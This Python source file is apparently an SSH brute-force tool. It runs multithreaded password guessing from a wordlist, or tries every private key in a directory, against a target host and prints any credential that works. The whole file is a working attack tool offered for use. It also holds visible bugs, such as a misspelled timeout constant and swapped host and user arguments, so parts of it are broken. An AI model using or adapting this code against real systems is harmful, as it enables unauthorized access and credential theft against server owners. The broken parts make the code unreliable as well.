#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import os
import optparse
import time
import pexpect

from pexpect import pxssh
from threading import *

MAX_CONNECTION = 10
CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTION)

Found = False
Fails = 0
FAIL_LIMIT = 10
KEYFILE = None
PASSWD = None
CIPHERS = 'aes128-cbc,3des-cbc,aes128-ctr,aes192-ctr,aes256-ctr'


def connect_with_passwd(host, user, passwd, release):
    global Found, Fails, PASSWD
    s = None
    try:
        s = pxssh.pxssh(options={'Ciphers':CIPHERS})
        s.login(host, user, passwd)
        PASSWD = passwd
        Found = True
        s.logout()
    except Exception as e:
        # 出现错误 s置为空
        if 'read_nonblocking' in str(e):
            Fails+=1
            time.sleep(5)
            connect_with_passwd(host,user,passwd,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect_with_passwd(host,user,passwd,False)
        elif 'Could not establish connection to host' in str(e):
            Fails+=1
            time.sleep(2)
    finally:
        if s:
            s.close()
        if release:
            CONNECTION_LOCK.release()


def connect_with_key(user, host, keyfile, release):
    global Found
    global Fails
    global KEYFILE
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        connStr = 'ssh '+user+'@'+host+' -i '+keyfile+opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])
        if ret==0 or ret==1:
            # print('[-] Connect Failed.Time out error.')
            Fails+=1
        elif ret==2:
            # print('[-] Adding Host to !/.ssh/known_hosts')
            child.sendline('yes')
            connect_with_key(user,host,keyfile,False)
        elif ret==3:
            # print('[-] Connection Closed By Remote Host')
            Fails+=1
        elif ret>3:
            # print('[+] Success. '+str(keyfile))
            KEYFILE = str(keyfile)
            Found = True
    finally:
        if release:
            CONNECTION_LOCK.release()


def ssh_key(user, host, passDir):
    global Found
    global Fails
    threads = []
    for filename in os.listdir(passDir):
        if Found:
            break
        if Fails > FAIL_LIMIT:
            break
        fullpath = os.path.join(passDir,filename)
        print('[*] Testing keyfile '+str(fullpath))
        t = Thread(target=connect_with_key,args=(user,host,fullpath,True))
        t.setDaemon(True)
        threads.append(t)
        t.start()
    if not Found:
        for t in threads:
            t.join()


def ssh_pass(host, user, passwdFile):
    global Found
    global Fails
    threads = []
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            break
        if Fails>FAIL_LIMIT:
            break
        CONNECTION_LOCK.acquire()
        passwd = line.strip('\r').strip('\n')
        print('[*] Host:'+host+' Testing: '+str(passwd))
        t = Thread(target=connect_with_passwd, args=(host, user, passwd, True))
        t.setDaemon(True)
        threads.append(t)
        t.start()
    if not Found:
        for t in threads:
            t.join()


def reset():
    global Found, Fails
    global PASSWD, KEYFILE
    Found = False
    Fails = 0
    KEYFILE = None
    PASSWD = None


def bruteSSH(host, user, *, passKeyDir=None, passwdFile=None, maxConnection=None):
    if passKeyDir is None and passwdFile is None:
        print('[-] Wrong parameters.')

    global MAX_CONNECTION, CONNECTION_LOCK
    global Found, Fails
    global PASSWD, KEYFILE

    if maxConnection != 10 and maxConnection is not None and maxConnection != '':
        MAX_CONNECTION = int(maxConnection)
        CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTION)
    ret = {'ip': host, 'user': user, 'type': None, 'key': None}
    if passKeyDir:
        ssh_key(host, user, passKeyDir)
        if Found:
            print('[+] Keyfile Found: '+KEYFILE)
        elif Fails>FAIL_LIMIT:
            print('[-] Exiting: Too Many Connections Closed By Remote Host.')
            print('[-] Adjust number of simultaneous threads.')
        else:
            print('[-] No Key Found.')
        ret['type'] = 'publicKey'
        ret['key'] = KEYFILE
        reset()
        return ret
    elif passwdFile:
        ssh_pass(host, user, passwdFile)
        if Found:
            print('[+] '+host+'\'s Password Found: '+PASSWD)
        elif Fails > FAIL_LIMIT:
            print('[-] Too Many Socket Timeouts Or Could not establish connection to host')
        else:
            print('[-] No Password Found.')
        ret['type'] = 'password'
        ret['key'] = PASSWD
        ret['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
        reset()
        return ret


def main():
    parser = optparse.OptionParser('usage %prog '+'-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-d', dest='passKeyDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('--maxc', dest='maxConnection', type='string', help='specify the max connections')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    passKeyDir = options.passKeyDir
    user = options.user
    maxConnection = options.maxConnection

    if host is None or (passwdFile is None and passKeyDir is None) or user is None:
        print(parser.usage)
        exit(0)

    try:
        bruteSSH(host, user, passwdFile=passwdFile, passKeyDir=passKeyDir, maxConnection=maxConnection)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print('[-]', e)


if __name__=="__main__":
    main()
